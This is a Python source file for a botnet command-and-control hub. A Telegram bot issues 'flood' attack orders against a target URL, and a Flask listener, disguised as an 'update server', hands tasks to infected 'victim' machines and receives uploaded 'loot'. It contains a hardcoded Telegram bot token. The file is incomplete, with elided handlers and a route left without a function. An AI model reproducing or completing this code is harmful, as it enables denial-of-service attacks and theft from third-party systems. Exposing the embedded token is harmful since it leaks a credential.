import logging
import threading
import sqlite3
import json
import time
import uuid
import datetime
from flask import Flask, request, jsonify
from telegram import Update, ForceReply, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler

# CONFIGURATION
BOT_TOKEN = "8209736694:AAGdDD_ko9zq27C-gvCIDqCHAH3UnYY9RJc"
ADMIN_USERNAME = "dlnkai" # The handle provided by user
C2_PORT = 5000
DB_FILE = "mothership.db"

# LOGGING
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# FLASK C2 APP
app = Flask(__name__)
bot_instance = None # To hold the bot app for cross-thread messaging
admin_chat_id = None # Dynamically captured

# --- DATABASE MANAGEMENT ---
def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    # Victims Table
    c.execute('''CREATE TABLE IF NOT EXISTS victims
                 (id TEXT PRIMARY KEY, ip TEXT, os TEXT, last_seen TEXT)''')
    # Loot Table
    c.execute('''CREATE TABLE IF NOT EXISTS loot
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, type TEXT, data TEXT, timestamp TEXT)''')
    # Commands Table (Real C2)
    c.execute('''CREATE TABLE IF NOT EXISTS commands
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, cmd TEXT, target TEXT, active INTEGER)''')
    conn.commit()
    conn.close()

# ... (Previous DB functions) ...

def db_add_command(cmd, target):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    # Deactivate old commands of same type
    c.execute("UPDATE commands SET active=0 WHERE cmd=?", (cmd,))
    c.execute("INSERT INTO commands (cmd, target, active) VALUES (?, ?, 1)", (cmd, target))
    conn.commit()
    conn.close()

def db_get_active_command():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    res = c.execute("SELECT cmd, target FROM commands WHERE active=1 ORDER BY id DESC LIMIT 1").fetchone()
    conn.close()
    return res if res else ("wait", "0")

# --- TELEGRAM BOT HANDLERS ---
# ... (Previous handlers) ...

async def cmd_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # REAL ATTACK COMMAND
    user = update.effective_user
    if user.username != ADMIN_USERNAME: return

    target = " ".join(context.args)
    if not target:
        await update.message.reply_text("⚠️ **Syntax:** `/attack <http://target.com>`", parse_mode='Markdown')
        return
    
    # 1. Register Command in DB
    db_add_command("flood", target)
    
    # 2. Notify Admin
    conn = sqlite3.connect(DB_FILE)
    bot_count = conn.cursor().execute("SELECT count(*) FROM victims").fetchone()[0]
    conn.close()
    
    await update.message.reply_text(f"⚔️ **COMMAND ISSUED: REAL ATTACK**\n🎯 Target: `{target}`\n🤖 Botnet Size: `{bot_count} Agents`\n⚡ Status: **EXECUTING NOW**", parse_mode='Markdown')

async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.username != ADMIN_USERNAME: return
    db_add_command("stop", "0")
    await update.message.reply_text("🛑 **ATTACK STOPPED.** All (Real) agents holding fire.")

# --- FLASK HANDLERS (C2 LISTENER) ---
@app.route('/get_task', methods=['GET'])
def poll_task():
    """Real Bots poll this endpoint to get orders."""
    cmd, target = db_get_active_command()
    return jsonify({"command": cmd, "target": target}), 200

@app.route('/upload', methods=['POST'])
# ... (Receive Loot logic preserved) ...


@app.route('/', methods=['GET'])
def index():
    return "Antigravity Update Server v2.0 (Stable)", 200

# --- MAIN LOOPS ---
def run_flask():
    print(f"[*] C2 Server Listening on 0.0.0.0:{C2_PORT}")
    app.run(host='0.0.0.0', port=C2_PORT, debug=False, use_reloader=False)

def main():
    print("--- [ dLNk MOTHERSHIP: C2 & BOT HUB ] ---")
    init_db()
    
    # Start Flask in separate thread
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    
    # Start Telegram Bot (Main Thread)
    print("[-] Connecting to Telegram Network...")
    application = ApplicationBuilder().token(BOT_TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("gen_key", cmd_gen_key))
    application.add_handler(CommandHandler("status", cmd_status))
    application.add_handler(CommandHandler("broadcast", cmd_broadcast))
    application.add_handler(CommandHandler("attack", cmd_attack))
    
    print("[+] System Fully Operational.")
    application.run_polling()

if __name__ == '__main__':
    main()
